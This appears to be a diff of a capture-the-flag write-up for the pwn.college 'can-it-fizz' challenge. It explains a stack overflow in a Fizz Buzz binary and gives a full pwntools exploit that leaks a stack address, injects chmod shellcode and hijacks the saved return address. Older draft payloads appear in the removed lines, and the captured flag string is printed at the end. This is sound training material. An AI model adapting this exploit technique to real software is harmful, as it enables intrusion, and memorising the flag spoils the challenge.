+           rbp+0x08        │  saved RIP                │ ← strcpy writes sc_addr here
+                           └───────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════════════════════
+strcpy(saved_rip_addr, &sc_addr_bytes) fires
+    → copies sc_addr bytes until the null high byte of the address (0x00)
+    → saved RIP now contains sc_addr
+═══════════════════════════════════════════════════════════════════════════════════
+
+Counter HIDWORD (0x00007fff...) ≥ 16 → loop exits
+challenge() returns → ret pops sc_addr → execution jumps to shellcode
+```
+
+### Why arr[11], Not arr[12]
+
+`arr[12]` is always `rbp−0x6C` — a compile-time constant baked in at `arr[12] = (char *)arr + 4`. Leaking it would give you `rbp−0x6C`, from which you'd compute `rbp = leaked + 0x6C`. That's the same rbp you get from leaking `arr[11]` with `rbp = leaked + 0x24`. Both paths lead to the same place — but leaking `arr[12]` is circular: you'd need rbp to know where arr[12] *lives* in memory to read it in the first place, and its value only tells you rbp back. `arr[11]` in the Buzz branch is a runtime-assigned stack address driven by the branch logic, not a compile-time formula — making it the genuine unknown worth leaking.
+
+### Do We Need Any Runtime Debugging?
+
+No. The frame is fixed-size (`sub rsp, 0x90`) and every offset is a compile-time constant. GDB was useful during static analysis to confirm the stack layout and verify what value `arr[11]` holds in the Buzz branch, but the exploit itself requires zero runtime debugging. The only unknown at exploit time is the stack base address, and one `printf` spill resolves it. After that, every address is pure arithmetic.
 
 ### Exploit
 
-```py
+```py title="~/script.py" showLineNumbers
 from pwn import *
-
 context.arch = "amd64"
-
-# Initialize data
-buffer_addr = 0x7ffded2c72f4
-counter_value = 0x80000005          # -20
-counter_addr = 0x7ffded2c7334
-buf_11_ptr_addr = 0x7ffded2c7338
-buf_12_ptr_addr = 0x7ffded2c7340
-addr_to_saved_ip = 0x7ffded2c7358
-offset_to_counter = (counter_addr - buffer_addr)                    # 64 bytes
-offset_to_buf_11_ptr = buf_11_ptr_addr - (counter_addr + 4)         # 
-offset_t0_buf_12_ptr = buf_12_ptr_addr - (buf_11_ptr_addr + 8)
-offset_to_ret = addr_to_saved_ip - (buf_12_ptr_addr + 8)
+context.os = "linux"
 
 p = process("/challenge/can-it-fizz")
+p.recvuntil(b"Welcome to Fizz Buzz!\n")
 
-# ---- Stage 1: v[11] leak ----
-p.recvuntil(b"0: ")
+# burn i=0..4
+for i in range(5):
+    p.recvuntil(f"{i}: ".encode())
+    p.send(b"\n")
+    p.recvuntil(b"Correct answer: ")
+    p.recvline()
 
-# Craft payload
-payload = b"A" * 4                                              # buf[2] Last 4 bytes
-payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # buf[3] ... buf[8] 48 bytes
-payload += b"C" * 4                                             # buf[9] First 4 bytes
-payload += b"BUFF"                                      # buf[9] Last 4 bytes
-payload += b"D" * 4                  # buf[10] First 4 bytes (LODWORD)
-payload += p32(counter_value)                           # buf[10] Last 4 bytes (HIDWORD)
-
-# Send payload
+# Stage 1: leak arr[11] on i=5 (Buzz branch)
+p.recvuntil(b"5: ")
+payload  = b"A" * 52            # +0..+51  pad
+payload += b"BUZZ"              # +52..+55 arr[9] LODWORD — non-null
+payload += b"CCCC"              # +56..+59 arr[9] HIDWORD — bridge the "\n\0" gap
+payload += b"D" * 4             # +60..+63 arr[10] LODWORD — filler
+payload += p32(0xFFFFFFFF)      # +64..+67 arr[10] HIDWORD = −1, loop continues
 p.send(payload)
 
-# # Extract relevant pointer
-# p.recvuntil(b"\xfb\xff\xff\xff")
-# buf_11_ptr_raw = p.recv(6)
-# buf_11_ptr = u64(buf_11_ptr_raw.ljust(8, b"\x00"))
-# log.success(f"v[11] pointer raw: {buf_11_ptr}")
-# log.success(f"v[11] pointer hex: {hex(buf_11_ptr)}")
+p.recvuntil(b"You entered: ")
+raw = p.recvn(75)
+leaked_addr = u64(raw[68:74] + b"\x00\x00")  # arr[11] = rbp−0x24
 
+rbp        = leaked_addr + 0x24
+sc_addr    = rbp - 0x58
+saved_rip  = rbp + 0x08
 
-# # ---- Stage 2: v[12] leak ----
-# # Craft payload
-# payload = b"A" * 4                                      # buf[2] Last 4 bytes
-# payload += b"B" * (offset_to_counter - (4 + 8))         # buf[1] ... buf[8] All 8 bytes
-# payload += b"C" * 4                                     # buf[9] First 4 bytes
-# payload += b"BUZZ"                                      # buf[9] Last 4 bytes
-# payload += b"D" * 4                                     # buf[10] First 4 bytes
-# payload += p32(counter_value)                           # buf[10] Last 4 bytes
-# payload += p64()
+p.recvuntil(b"Correct answer: ")
+p.recvline()
 
-# # Send payload
-# p.send(payload)
-
-# # Extract relevant pointer
-# p.recvuntil(b"BBBBBBBB")
-# v_12_ptr_raw = p.recv(6)
-# v_12_ptr = u64(v_12_ptr_raw.ljust(8, b"\x00"))
-# log.success(f"v[12] pointer raw: {v_12_ptr}")
-# log.success(f"v[12] pointer hex: {hex(v_12_ptr)}")
-
-
-# # ---- Stage 3: shellcode ----
-# shellcode_asm = """
-#    /* chmod("z", 0004) */
-#    push 0x5a
-#    push rsp
-#    pop rdi
-#    pop rax
-#    mov sil, 0x4
-#    syscall
-# """
-# shellcode_addr = v_12_ptr - 16
-# shellcode = asm(shellcode_asm)
-# len_shellcode = len(shellcode)
-
-# # Craft payload
-# payload = shellcode
-# payload = b"A" * (offset_to_counter - len_shellcode)
-# payload += p64(counter_value)
-# payload += b"B" * 8
-# payload += p64(shellcode_addr)
-
-# # Send payload
-# p.send(payload)
-
-p.interactive()
-```
-
-```py
-from pwn import *
-
-context.arch = "amd64"
-
-# Initialize data
-buffer_addr = 0x7ffded2c72f4
-# counter_value = 0xfffffffffffffffb          # -20
-counter_value = 0xfffffffb
-counter_addr = 0x7ffded2c7334
-arr_11_ptr_addr = 0x7ffded2c7338
-arr_12_ptr_addr = 0x7ffded2c7340
-addr_to_saved_ip = 0x7ffded2c7358
-offset_to_counter = (counter_addr - buffer_addr)                    # 64 bytes
-offset_to_arr_11_ptr = arr_11_ptr_addr - (counter_addr + 4)         # 
-offset_t0_arr_12_ptr = arr_12_ptr_addr - (arr_11_ptr_addr + 8)
-offset_to_ret = addr_to_saved_ip - (arr_12_ptr_addr + 8)
-
-p = process("/challenge/can-it-fizz")
-
-# ---- Stage 1: arr[11] leak ----
+# Stage 2: shellcode + hijack on i=0 (FizzBuzz, counter wrapped to 0)
 p.recvuntil(b"0: ")
 
-# Craft payload
-payload = b"A" * 4                                              # arr[2] Last 4 bytes
-payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # arr[3] ... arr[8] 48 bytes
-payload += b"C" * 4                                             # arr[9] First 4 bytes
-payload += b"BUFF"                                              # arr[9] Last 4 bytes "Buzz"
-# payload += p64(counter_value)                                   # arr[10] 8 bytes (HIDWORD)
-payload += b"DDDD"
-payload += p32(counter_value)
+shellcode = asm("""
+    mov rax, 0x67616c662f
+    push rax
+    mov rdi, rsp
+    push 4
+    pop rsi
+    xor eax, eax
+    mov al, 90
+    syscall
+    xor edi, edi
+    xor eax, eax
+    mov al, 60
+    syscall
+""")  # 31 bytes
 
-# Send payload
+payload  = b"\x90" * 4         # +0..+3   NOP sled (BYTE4 target)
+payload += shellcode            # +4..+34  chmod shellcode
+payload += b"\x90" * 25        # +35..+59 NOP pad
+payload += p64(sc_addr)         # +60..+67 arr[10]: HIDWORD ≥ 16 → loop exits
+payload += p64(rbp - 0x20)      # +68..+75 arr[11]: ptr to sc_addr bytes at +60
+payload += p64(saved_rip)       # +76..+83 arr[12]: strcpy destination
 p.send(payload)
 
-# # Extract relevant pointer
-# p.recvuntil(b"\xfb\xff\xff\xff")
-# arr_11_ptr_raw = p.recv(6)
-# arr_11_ptr = u64(arr_11_ptr_raw.ljust(8, b"\x00"))
-# log.success(f"arr[11] pointer raw: {arr_11_ptr}")
-# log.success(f"arr[11] pointer hex: {hex(arr_11_ptr)}")
-
-
-# # ---- Stage 2: arr[12] leak ----
-# # Craft payload
-# payload = b"A" * 4                                      # arr[2] Last 4 bytes
-# payload += b"B" * (offset_to_counter - (4 + 8))         # arr[1] ... arr[8] All 8 bytes
-# payload += b"C" * 4                                     # arr[9] First 4 bytes
-# payload += b"BUZZ"                                      # arr[9] Last 4 bytes
-# payload += b"D" * 4                                     # arr[10] First 4 bytes
-# payload += p32(counter_value)                           # arr[10] Last 4 bytes
-# payload += p64()
-
-# # Send payload
-# p.send(payload)
-
-# # Extract relevant pointer
-# p.recvuntil(b"BBBBBBBB")
-# v_12_ptr_raw = p.recv(6)
-# v_12_ptr = u64(v_12_ptr_raw.ljust(8, b"\x00"))
-# log.success(f"arr[12] pointer raw: {v_12_ptr}")
-# log.success(f"arr[12] pointer hex: {hex(v_12_ptr)}")
-
-
-# # ---- Stage 3: shellcode ----
-# shellcode_asm = """
-#    /* chmod("z", 0004) */
-#    push 0x5a
-#    push rsp
-#    pop rdi
-#    pop rax
-#    mov sil, 0x4
-#    syscall
-# """
-# shellcode_addr = v_12_ptr - 16
-# shellcode = asm(shellcode_asm)
-# len_shellcode = len(shellcode)
-
-# # Craft payload
-# payload = shellcode
-# payload = b"A" * (offset_to_counter - len_shellcode)
-# payload += p64(counter_value)
-# payload += b"B" * 8
-# payload += p64(shellcode_addr)
-
-# # Send payload
-# p.send(payload)
-
-p.interactive()
+p.recvall(timeout=3)
+print(open("/flag").read())
 ```
 
-
 ```
-payload:
-counter_value = 0xfffffffb
-
-payload = b"A" * 4                                              # buf[2] Last 4 bytes
-payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # buf[3] ... buf[8] 48 bytes
-payload += b"C" * 4                                             # buf[9] First 4 bytes
-payload += b"BUFF"                                      # buf[9] Last 4 bytes
-payload += b"D" * 4                  # buf[10] First 4 bytes (LODWORD)
-payload += p32(counter_value)                           # buf[10] Last 4 bytes (HIDWORD)
-
-5: $ 
-You entered: 
-AAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCBUFFDDDD\x05
-Correct answer: BUFFDDDD\x05
-```
-
-
-```
-
-payload:
-counter_value = 0xfffffffffffffffb
-
-payload = b"A" * 4                                              # buf[2] Last 4 bytes
-payload += b"B" * (offset_to_counter - (4 + 4 + 4 + 4))         # buf[3] ... buf[8] 48 bytes
-payload += b"C" * 4                                             # buf[9] First 4 bytes
-payload += b"BUFF"                                      # buf[9] Last 4 bytes
-payload += p64(counter_value)                           # buf[10] 8 bytes
-
-5: $ 
-You entered: 
-AAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCBUFF\xfb\xff\xff\xff\x05
-Correct answer: BUFF\xfb\xff\xff\xff\x05
+hacker@program-security~can-it-fizz:~$ python ~/script.py
+pwn.college{cvAzdazNveWxwSm529b4bP5ozLU.QXxUDO4EDL4ITM0EzW}
 ```
